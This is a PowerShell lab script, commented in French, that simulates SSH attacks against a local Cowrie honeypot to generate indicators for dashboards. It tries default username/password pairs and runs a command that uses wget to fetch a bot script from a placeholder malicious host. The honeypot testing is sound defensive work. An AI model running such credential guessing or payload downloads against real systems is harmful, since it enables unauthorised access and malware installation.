# Simulation d'attaques locales contre Cowrie (laboratoire uniquement)
param(
    [string]$SshHost = "127.0.0.1",
    [int]$Port = 2222
)

Write-Host "=== Test SSH Cowrie sur ${SshHost}:${Port} ===" -ForegroundColor Cyan

if (-not (Get-Command ssh -ErrorAction SilentlyContinue)) {
    Write-Warning "OpenSSH client non trouvé. Installez-le ou utilisez PuTTY."
    exit 1
}

$attempts = @(
    @{ user = "root"; pass = "123456" },
    @{ user = "admin"; pass = "admin" },
    @{ user = "ubuntu"; pass = "password" }
)

foreach ($a in $attempts) {
    Write-Host "Tentative: $($a.user) / $($a.pass)"
    echo "y" | ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL `
        -o ConnectTimeout=5 -p $Port "$($a.user)@$SshHost" "uname -a; wget http://malicious.example/bot.sh" 2>$null
}

Write-Host "`nVérifiez les IOC : http://localhost:8080" -ForegroundColor Green
Write-Host "Kibana : http://localhost:5601"
